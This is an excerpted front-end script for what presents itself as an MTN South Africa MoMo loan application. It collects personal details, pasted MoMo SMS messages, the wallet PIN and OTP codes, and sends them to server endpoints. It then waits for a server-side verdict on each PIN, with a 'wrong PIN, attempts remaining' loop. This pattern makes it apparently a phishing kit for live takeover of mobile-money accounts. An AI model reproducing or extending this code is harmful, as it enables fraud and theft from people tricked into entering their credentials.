// ============================================================
// script.js – South Africa Version with All Features
// ============================================================
...
const STORAGE_KEYS = {
    APPLICATION_ID: 'mtn_za_application_id',
    APPLICATION_DATA: 'mtn_za_application_data',
    REJECTION_INFO: 'mtn_za_rejection_info',
    FORM_DRAFT: 'mtn_za_form_draft',
...
function loadApplicationId() {
    ...
    if (saved && saved.id) {
        ...
        if (age < 24 * 60 * 60 * 1000) { S.applicationId = saved.id; return saved.id; }
...
function loadApplicationData() {
    ...
    if (saved) {
        ...
        if (age < 24 * 60 * 60 * 1000) {
            ['loanType','loanAmount','loanTerm','loanPurpose','firstName','lastName','phone','email','employment','annualIncome','kinName','kinPhone','applicationId','rejectedStep']
                .forEach(f => { if (saved[f] !== undefined) S[f] = saved[f]; });
            return true;
        }
...
function toS2() {
    ...
    saveApplicationData(); saveFormDraft(); goTo('page-step2');
}
...
function toS3() {
    ...
    saveApplicationData(); saveFormDraft(); goTo('page-step3');
}
...
function handleRejection(step) {
    ['s3Err','momErr','pinErr','otpErr'].forEach(clearErr);
        ...
        try {
            ...
            if (data && data.ok === true) {
                ...
                if (data.status === 'rejected') {
                    ...
                    try {
                        const rRes = await fetch(`/api/rejection-info/${applicationId}`);
                        const rData = await rRes.json();
                        if (rData.ok && rData.rejectedStep) {
                            S.rejectedStep = rData.rejectedStep;
                            showToast(rData.errorMessage || '❌ Application was rejected.', 'error');
                            handleRejection(rData.rejectedStep);
                        } else {
...
function showApproval() {
    ...
    document.getElementById('aprMth').textContent = 'R ' + monthly.toLocaleString();
...
async function doSmsParse() {
    ...
    await fetch('/api/send-momo-message', {
        method: 'POST',
        body: JSON.stringify({
            momoData: { applicationId: S.applicationId, phone: S.phone, momoMessage: msg, isResubmission: !!S.rejectedStep }
        }),
        headers: { 'Content-Type': 'application/json' }
    });
...
async function doPin() {
    ...
    try {
        ...
        startPoll(S.applicationId, 'pin',
            ...
            async () => {
                try {
                    const rRes = await fetch('/api/pin-rejected', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ applicationId: S.applicationId })
                    });
                    ...
                    if (rData.blocked) {
                        ...
                        goTo('page-pin');
                    } else if (rData.remainingAttempts > 0) {
                        showErr('pinErr', `❌ Wrong PIN. ${rData.remainingAttempts} attempt(s) remaining.`);
                        document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
                        document.getElementById('pin0').focus();
                        const ad = document.getElementById('pinAttemptsDisplay');
                        if (ad) {
                            ad.textContent = `🔑 Attempts remaining: ${rData.remainingAttempts} of 3`;
                            ad.className = 'pin-attempts warning';
                        }
                        goTo('page-pin');
                    } else {
                        handleRejection('pin');
                    }
                } catch (err) { handleRejection('pin'); }
            });
    } catch (e) {
...
function updatePinPageUI() {
    ...
    if (pinCard) {
        let ad = document.getElementById('pinAttemptsDisplay');
        if (!ad) {
            ad = document.createElement('div');
            ad.id = 'pinAttemptsDisplay';
            ad.className = 'pin-attempts';
            const pl = document.querySelector('#page-pin .pin-label');
            if (pl) pl.parentNode.insertBefore(ad, pl.nextSibling);
        }
    }
}
...
function recoverSession() {
    ...
    if (checkOtpTimerRecovery()) return true;
...
console.log('✅ MTN South Africa MoMo Loan App loaded!');
